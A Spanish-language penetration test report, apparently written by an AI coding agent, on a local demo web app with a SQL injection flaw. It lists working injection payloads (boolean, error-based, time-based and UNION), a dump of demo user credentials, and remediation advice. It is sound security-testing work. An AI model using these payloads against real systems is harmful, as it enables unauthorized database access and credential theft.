# Informe de Análisis de Seguridad – SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30  
**Hora:** 15:25 UTC  
**Analista:** GitHub Copilot (claude-sonnet-4.6)

---

## 1. Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación permitió obtener acceso completo a la base de datos `sqli_demo`, incluyendo credenciales de 8 usuarios en texto plano.

---

## 2. Descripción del Target

| Campo | Valor |
|-------|-------|
| URL | http://web.dev.local:8083/ |
| Tecnología servidor | Apache 2.4.65 |
| Lenguaje | PHP 8.1.33 |
| Base de datos | MariaDB (MySQL >= 5.0) |
| SO | Linux Debian |

---

## 3. Vulnerabilidad Detectada

### 3.1 SQL Injection en parámetro `id`

- **Parámetro vulnerable:** `id` (método GET)
- **Tipo de inyección:** Error-based, Boolean-based blind, Time-based blind, UNION query
- **Severidad:** CRÍTICA (CVSS 9.8)

#### Evidencia de la vulnerabilidad

Al enviar una comilla simple en el parámetro `id`, el servidor devuelve un error SQL que confirma la inyección:

```
GET /?id=1'&Submit=Submit

Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; 
check the manual that corresponds to your MariaDB server version for the right 
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```

El error expone:
- El path real del archivo: `/var/www/html/low.php`
- El DBMS utilizado: MariaDB
- La ausencia de manejo de errores seguro

---

## 4. Vectores de Explotación Confirmados

### 4.1 Boolean-based blind
```
id=1' OR NOT 9498=9498#
```

### 4.2 Error-based (EXTRACTVALUE)
```
id=1' AND EXTRACTVALUE(4916,CONCAT(0x5c,0x7176786b71,(SELECT (ELT(4916=4916,1))),0x7162707171))-- XbML
```

### 4.3 Time-based blind
```
id=1' AND (SELECT 9954 FROM (SELECT(SLEEP(5)))VhDO)-- ciFu
```

### 4.4 UNION query (2 columnas)
```
id=1' UNION ALL SELECT NULL,CONCAT(0x7176786b71,<payload>,0x7162707171)#
```

---

## 5. Datos Exfiltrados

### 5.1 Bases de datos encontradas

| Base de datos |
|---------------|
| information_schema |
| mysql |
| performance_schema |
| **sqli_demo** |
| sys |

### 5.2 Tabla `sqli_demo.users` – Datos completos

| user_id | username | first_name | last_name | email | password |
|---------|----------|------------|-----------|-------|----------|
| 1 | admin | John | Doe | admin@example.com | password123 |
| 2 | jsmith | Jane | Smith | jane@example.com | secret456 |
| 3 | bjohnson | Bob | Johnson | bob@example.com | mypass789 |
| 4 | awilliams | Alice | Williams | alice@example.com | qwerty123 |
| 5 | cbrown | Charlie | Brown | charlie@example.com | password |
| 6 | ddavis | Diana | Davis | diana@example.com | secure123 |
| 7 | emiller | Eve | Miller | eve@example.com | hackme |
| 8 | fwilson | Frank | Wilson | frank@example.com | admin123 |

> ⚠️ Las contraseñas están almacenadas en **texto plano**, lo que agrava la criticidad.

---

## 6. Causa Raíz

El código en `/var/www/html/low.php` construye la consulta SQL concatenando directamente el input del usuario sin sanitización:

```php
// Ejemplo del código vulnerable (inferido):
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

---

## 7. Impacto

| Categoría | Descripción |
|-----------|-------------|
| **Confidencialidad** | Total – Acceso a todos los datos de la BD |
| **Integridad** | Alta – Posibilidad de modificar/eliminar datos |
| **Disponibilidad** | Media – Posibles ataques de DoS vía consultas pesadas |
| **Credenciales** | Comprometidas – 8 usuarios con passwords en texto plano |

---

## 8. Recomendaciones

1. **Usar consultas preparadas (Prepared Statements):**
   ```php
   $stmt = $mysqli->prepare("SELECT * FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que `id` sea un entero válido antes de usarlo.

3. **Hashear contraseñas:** Usar `password_hash()` con bcrypt en lugar de almacenar texto plano.

4. **Configurar manejo de errores:** Deshabilitar la exposición de errores SQL en producción (`display_errors = Off`).

5. **Principio de mínimo privilegio:** El usuario de BD solo debe tener los permisos estrictamente necesarios (no acceso a `information_schema`, `mysql`, etc.).

6. **WAF:** Implementar un Web Application Firewall como capa adicional de defensa.

---

## 9. Herramientas Utilizadas

- `curl` – Pruebas manuales iniciales
- `sqlmap 1.10.2` – Detección y explotación automatizada

---

## 10. Conclusión

La aplicación web en http://web.dev.local:8083 presenta una vulnerabilidad crítica de SQL Injection que permite a un atacante no autenticado extraer completamente la base de datos, incluyendo credenciales de todos los usuarios en texto plano. Se requiere corrección inmediata.
